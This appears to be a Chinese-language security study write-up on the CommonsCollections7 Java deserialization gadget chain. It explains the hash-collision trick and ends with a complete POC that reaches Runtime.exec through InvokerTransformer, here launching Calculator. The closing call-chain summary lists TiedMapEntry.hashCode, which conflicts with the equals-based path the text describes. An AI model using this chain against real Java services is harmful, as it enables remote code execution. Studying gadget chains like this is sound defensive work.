# 环境搭建
> 1. `JDK`版本：JDK1.8u66
> 2. `Commons-Collections`版本：3.1

> 利用`maven`来进行搭建，先创建一个`Maven`项目，不用选择任何`Maven`模板，`pom.xml`中内容如下，之后选择右侧的更新，让其自动导入包即可

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>

</project>
```

# 前置知识
## Hashtable
> `Hashtable`与`HashMap`类似，都是是一种`key-value`形式的哈希表

```java
[1] Hashtable 线程安全，HashMap 线程不安全
[2] HashMap 继承 AbstractMap，而 Hashtable 继承 Dictionary
[3] 两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现
[4] Hashtable 的 key-value 不允许为 null 值，但是 HashMap 则是允许的，后者会将 key=null 的实体放在 index=0 的位置
```

> 跟进`Hashtable`发现，在`readObject`方法中，会调用`reconstitutionPut()`方法，并在`reconstitutionPut()`方法中会调用`key.hashCode()`，后续的调用逻辑和`CommonsCollections6`链基本一致

<img src="./Java安全学习-Commons-Collections4567/23.png" alt="">

## 哈希碰撞机制
> 在[ProgrammerSought](https://www.programmersought.com/article/94401321514/)上给出的说法是

```
The so-called hash conflict, that is, the two key values ​​are calculated by the hash function to obtain the same hash value, and a subscript can only store one key, which produces a hash conflict, if the subscript one of the keys first Saved, the other key must find its own storage location by other means.
```
> 也就是说，当两个不同的`key`通过`hash()`方法计算出同一个`hash`值时，而一个下标只能存储一个`key`，这就产生了`hash`冲突

> 那么要如何构造出一个`hash`冲突呢，跟进`HashMap#hash`方法

<img src="./Java安全学习-Commons-Collections4567/27.png" alt="">

> 继续跟进`hashcode()`方法，根据`for`循环中的代码，不难推出`Hash`值的计算公式

<img src="./Java安全学习-Commons-Collections4567/28.png" alt="">

<img src="./Java安全学习-Commons-Collections4567/29.png" alt="">

> 这也就不难解释为什么`ysoserial`项目中的`CommonsCollections7`链中是`yy`和`zZ`了，需要时，利用`z3`来计算字符串位数不一样情况下的可能值即可

```python
ord("y") == 121
ord("z") == 122
ord("Z") == 90
"yy".hashCode() == 31 × 121 + 1 × 121 == 3872
"zZ".hashCode() == 31 × 122 + 1 × 90 == 3872
"yy".hashCode() == "zZ".hashCode() == 3872
```


# CommonsCollections7 分析
> 在`CommonsCollections`链中，利用`AbstractMap#equals`来触发对`LazyMap#get`方法的调用，这里的`m`如果是可控的话，那么设置`m`为`LazyMap`，就可以完成后面的链子构造

<img src="./Java安全学习-Commons-Collections4567/24.png" alt="">

> 继续跟进看看`equals`方法的调用点在哪，在前面的`Hashtable#reconstitutionPut`方法中存在着调用点：`e.key.equals(key)`，如果这里的`key`可控的话，上面的`m`也就是可控的

> 观察到在`readObject`方法中传递进去的`key`，相应的，那么在`writeObject`处也会存在`Hashtable#put`进入的值

<img src="./Java安全学习-Commons-Collections4567/25.png" alt="">

> 这里还需要注意一个点，由于`if`语句是用`&&`连接判断条件的，那么要执行到后面的`e.key.equals(key)`，就必须先要满足`e.hash == hash`，接着调用`equals`方法，这里利用到了`Hash`冲突(`Hash`碰撞)机制

<img src="./Java安全学习-Commons-Collections4567/26.png" alt="">

> 在`POC`中移除第二个`LazyMap`中的元素是因为`get`方法向当前的`map`添加了新元素，从而`map2`变成了两个元素

<img src="./Java安全学习-Commons-Collections4567/31.png" alt="">

## POC

```java
package CommonsCollections7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 6:40 下午
 */
public class CommonsCollections7Gadget {

    public static void CC7() throws NoSuchFieldException, IllegalAccessException {
        Transformer[] faketransformer = new Transformer[]{};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(faketransformer);

        Map hashMap1 = new HashMap();
        Map hashMap2 = new HashMap();

        Map map1 = LazyMap.decorate(hashMap1, chainedTransformer);
        map1.put("yy", 1);
        Map map2 = LazyMap.decorate(hashMap2, chainedTransformer);
        map2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(map1, 1);
        hashtable.put(map2, 1);
        Class _class = chainedTransformer.getClass();
        Field field = _class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        map2.remove("yy");

        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(hashtable);
            objectOutputStream.close();

            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC7();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
<img src="./Java安全学习-Commons-Collections4567/30.png" alt="">

# 调用链

```java
Hashtable.readObject()
   TiedMapEntry.hashCode()
        LazyMap.get()
            ChainedTransformer.transform()
                ConstantTransformer.transform()
                    InvokerTransformer.transform()
```

# 总结
> 主体思想是用`Hashtable`代替`HashMap`触发`LazyMap`，后续利用与`CommonsCollections6`链的`HashMap`利用方式基本一致